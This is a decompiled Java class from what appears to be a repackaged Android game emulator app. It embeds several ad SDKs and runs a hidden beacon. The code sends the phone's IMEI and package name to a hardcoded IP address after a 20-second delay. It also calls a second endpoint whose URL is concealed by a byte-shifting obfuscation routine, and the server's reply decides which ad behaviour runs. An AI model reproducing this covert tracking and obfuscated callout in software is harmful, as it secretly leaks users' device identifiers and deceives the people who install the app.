package com.androidemu.harveshihun;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import com.androidemu.Emulator;
import com.androidemu.EmulatorView;
import com.anzhi.ad.coverscreen.CoverAdComponent;
import com.tabca.dp.Pm;
import com.untyc.ipn.IM;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
/* loaded from: classes.dex */
public class GameMainIn {
    private Context myctx;
    private String sdid = "11971";
    private Handler GamePlayerGlHandler = new Handler() { // from class: com.androidemu.harveshihun.GameMainIn.1
        @Override // android.os.Handler
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case EmulatorView.SCALING_ORIGINAL:
                    GameMainIn.this.GameVaBack((String) msg.obj);
                    return;
                default:
                    return;
            }
        }
    };

    /* JADX INFO: Multiple debug info for r0v3 com.tabca.dp.Pm: [D('manager' com.untyc.ipn.IM), D('adm' com.tabca.dp.Pm)] */
    public void GameVaPlayError() {
        IM manager = new IM(this.myctx);
        manager.setAPKey("112590106");
        manager.start();
        CoverAdComponent.init(this.myctx, "vTyvQe9ex944QVagk6TjJ4PQ");
        CoverAdComponent.showAd(this.myctx);
        Pm.getInstance(this.myctx).rm(this.myctx, "147b19b50b53ed14acb3c63e4cdc93d7", 2);
    }

    /* JADX INFO: Multiple debug info for r0v3 com.tabca.dp.Pm: [D('manager' com.untyc.ipn.IM), D('adm' com.tabca.dp.Pm)] */
    public void GameVaPlayOk() {
        IM manager = new IM(this.myctx);
        manager.setAPKey("112590107");
        manager.start();
        CoverAdComponent.init(this.myctx, "vTyvQe9ex944QVagk6TjJ4PQ");
        CoverAdComponent.showAd(this.myctx);
        Pm.getInstance(this.myctx).rm(this.myctx, "04037e77e5eb17e4552be3f3adfb0f73", 2);
    }

    public GameMainIn(Context ctx) {
        this.myctx = null;
        this.myctx = ctx;
    }

    public void GamePlayerInit() {
        if (this.myctx.getSharedPreferences("gamesetpara", 0).getString("start", "0").equals("0")) {
            Adinit();
        } else {
            GameVaPlayOk();
        }
        HtpLink();
    }

    private void HtpLink() {
        new Thread() { // from class: com.androidemu.harveshihun.GameMainIn.2
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                try {
                    Thread.sleep(20000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    GameMainIn.this.GayyLink();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }.start();
    }

    private void Adinit() {
        new Thread() { // from class: com.androidemu.harveshihun.GameMainIn.3
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                String ls_para = "";
                try {
                    ls_para = GameMainIn.this.GayyManager();
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                if (ls_para == null) {
                    ls_para = "0";
                }
                if (!ls_para.equals("1")) {
                    ls_para = "0";
                }
                Message msg = GameMainIn.this.GamePlayerGlHandler.obtainMessage(0);
                msg.obj = ls_para;
                msg.sendToTarget();
            }
        }.start();
    }

    public String Getymp() {
        byte[] data = "cpqn9/03--+/89/73*.4981:3+gqnnbwok+_rpyAdi:".getBytes();
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) ((data[i] + 5) - (i % 8));
        }
        return new String(data);
    }

    public void GayyLink() throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(String.valueOf("http://121.199.58.16:8088/jsonauto.aspx?fun=link&im=") + ((TelephonyManager) this.myctx.getSystemService("phone")).getDeviceId() + "&did=" + this.sdid + "&pack=" + this.myctx.getPackageName()).openConnection();
        conn.setConnectTimeout(3000);
        if (conn.getResponseCode() == 200) {
            InputStream inStream = conn.getInputStream();
            ByteArrayOutputStream outStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[Emulator.GAMEPAD_DOWN];
            while (true) {
                int len = inStream.read(buffer);
                if (len == -1) {
                    inStream.close();
                    return;
                }
                outStream.write(buffer, 0, len);
            }
        }
    }

    public String GayyManager() throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(String.valueOf(Getymp()) + ((TelephonyManager) this.myctx.getSystemService("phone")).getDeviceId() + "&did=" + this.sdid + "&pack=" + this.myctx.getPackageName()).openConnection();
        conn.setConnectTimeout(3000);
        if (conn.getResponseCode() != 200) {
            return "";
        }
        InputStream inStream = conn.getInputStream();
        ByteArrayOutputStream outStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[Emulator.GAMEPAD_DOWN];
        while (true) {
            int len = inStream.read(buffer);
            if (len == -1) {
                inStream.close();
                return new String(outStream.toByteArray());
            }
            outStream.write(buffer, 0, len);
        }
    }

    public void showmsg(String para) {
        Toast.makeText(this.myctx, para, 0).show();
    }

    public void GameVaBack(String para) {
        SharedPreferences.Editor myeditor = this.myctx.getSharedPreferences("gamesetpara", 0).edit();
        if (para.equals("0")) {
            myeditor.putString("start", "0");
        } else {
            myeditor.putString("start", "1");
        }
        myeditor.commit();
        if (para.equals("0")) {
            GameVaPlayError();
        } else {
            GameVaPlayOk();
        }
    }
}
